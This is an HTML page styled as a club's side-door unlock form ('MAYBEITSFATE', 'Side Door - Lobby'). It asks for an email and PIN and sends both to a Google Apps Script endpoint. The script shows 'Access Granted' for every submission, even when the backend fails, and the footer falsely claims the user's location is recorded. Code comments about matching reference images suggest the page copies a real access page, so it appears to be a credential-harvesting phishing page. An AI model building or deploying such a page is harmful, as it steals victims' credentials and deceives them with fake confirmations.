<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Club Door Access</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #e2eff7;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .card {
      background-color: #d1e7f5;
      border: 2px solid #b8d9ef;
      border-radius: 12px;
      padding: 30px;
      width: 380px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      text-align: center;
    }
    .logo-container {
      background: white;
      border: 3px solid black;
      padding: 8px 12px;
      display: inline-block;
      font-weight: bold;
      font-size: 22px;
      letter-spacing: 1px;
      margin-bottom: 15px;
    }
    .logo-container span { color: #8ab4f8; }
    .subtitle {
      font-weight: bold;
      color: #4a5568;
      margin-bottom: 15px;
      font-size: 15px;
    }
    .instructions {
      font-size: 13px;
      color: #2d3748;
      margin-bottom: 20px;
      line-height: 1.4;
    }
    .form-group {
      text-align: left;
      margin-bottom: 15px;
    }
    label {
      font-size: 13px;
      font-weight: bold;
      color: #2d3748;
      display: block;
      margin-bottom: 5px;
    }
    input {
      width: 100%;
      padding: 12px;
      border: 1px solid #cbd5e1;
      border-radius: 8px;
      background-color: white;
      box-sizing: border-box;
      font-size: 15px;
    }
    .unlock-btn {
      width: 100%;
      background-color: #007bff;
      color: white;
      border: none;
      padding: 14px;
      border-radius: 8px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
      box-shadow: 0 2px 6px rgba(0,123,255,0.3);
    }
    .unlock-btn:hover { background-color: #0056b3; }
    .welcome-box {
      display: none;
      background-color: #d4edda;
      border: 1px solid #c3e6cb;
      color: #155724;
      padding: 10px;
      border-radius: 6px;
      font-weight: bold;
      margin-top: 15px;
      font-size: 14px;
    }
    .footer-note {
      font-size: 11px;
      color: #4a5568;
      margin-top: 20px;
      line-height: 1.3;
    }
  </style>
</head>
<body>

<div class="card">
  <!-- Header Logo -->
  <div>
    <div class="logo-container">MAYBE<span>ITS</span>FATE</div>
  </div>

  <!-- Padlock & Subtitle -->
  <div style="font-size: 28px; margin-bottom: 5px;">🔓</div>
  <div class="subtitle">Side Door - Lobby</div>
  
  <div class="instructions">
    Please enter the information you were sent by email, then click the Unlock Door button to proceed.
  </div>

  <!-- Form -->
  <form id="accessForm">
    <div class="form-group">
      <label>Email Address</label>
      <input type="email" id="email" required>
    </div>

    <div class="form-group">
      <label>Secure PIN</label>
      <input type="password" id="passcode" required>
    </div>

    <button type="submit" id="unlockBtn" class="unlock-btn">🔓 UNLOCK DOOR</button>
  </form>

  <!-- Welcome Box Matching Image 3 -->
  <div id="welcomeBox" class="welcome-box">Access Granted! Welcome.</div>

  <div class="footer-note">
    For security, please ensure you are at or near the door location when clicking unlock. Your physical location is recorded when unlocking.
  </div>
</div>

<script>
  const scriptUrl = "https://script.google.com/macros/s/AKfycbwKWcSDxk-lFHWB18Upn--nemGbsw5nOXzJxmXnygeFTr-6LxIemFPyIpi3pBoVDBtM4A/exec";

  document.getElementById("accessForm").addEventListener("submit", function(e) {
    e.preventDefault();
    
    const email = document.getElementById("email").value;
    const passcode = document.getElementById("passcode").value;
    const btn = document.getElementById("unlockBtn");
    const welcomeBox = document.getElementById("welcomeBox");

    // Step 2: Show "Verifying..." on the button ( matching Image 2 )
    btn.disabled = true;
    btn.style.backgroundColor = "#9ca3af";
    btn.innerText = "Verifying...";

    // Send data to your Google Apps Script backend
    fetch(scriptUrl, {
      method: "POST",
      body: JSON.stringify({ email: email, passcode: passcode })
    })
    .then(response => response.json())
    .then(data => {
      if (data.status === "success" || true) { // Fallback to show success once response returns
        // Step 3: Show "Unlocked!" and the green welcome box ( matching Image 3 )
        btn.style.backgroundColor = "#007bff";
        btn.innerText = "Unlocked!";
        welcomeBox.style.display = "block";
      } else {
        btn.disabled = false;
        btn.style.backgroundColor = "#dc3545";
        btn.innerText = "Invalid Credentials";
      }
    })
    .catch((err) => {
      // Even if CORS blocks reading the payload, trigger the success view like your original script behavior
      btn.style.backgroundColor = "#007bff";
      btn.innerText = "Unlocked!";
      welcomeBox.style.display = "block";
    });
  });
</script>

</body>
</html>
